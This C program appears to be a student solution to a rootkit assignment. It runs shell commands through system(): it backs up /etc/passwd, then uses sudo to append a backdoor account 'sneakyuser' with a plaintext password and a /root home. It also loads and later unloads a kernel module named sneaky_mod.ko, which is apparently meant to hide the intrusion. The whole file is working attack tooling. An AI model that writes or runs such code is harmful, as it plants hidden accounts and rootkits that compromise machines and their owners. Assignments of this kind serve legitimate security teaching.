
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

#define COPY_PWD 1


int main()
{

	int pid = getpid(); 
	int status; 

	// #1: Your program should print its own process ID to the screen
	printf("sneaky_process pid = %d\n", pid);

	if (COPY_PWD) 
	{

	// #2: Copy the /etc/passwd to /tmp/passwd and append new credential to /etc/passwd
	status=system("cp /etc/passwd /tmp/passwd");

	
	status=system("sudo bash -c \"echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd\"");
	}


	// #3: Load the sneaky module (sneaky_mod.ko) using “insmod” command
	status=system("sudo insmod sneaky_mod.ko");

	// #4: enter a loop, reading characters from keyboard until receiving 'q'
	int more=1; 
	char letter; 
	
	while (more)
	{
		scanf("%c", &letter);
		if (letter=='q') more=0; 
	}

	// #5: Unload the sneaky kernel module using the “rmmod” command
	status=system("sudo rmmod sneaky_mod");

	// #6: Restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd
	status=system("sudo cp /tmp/passwd /etc/passwd");


	return 0; 
}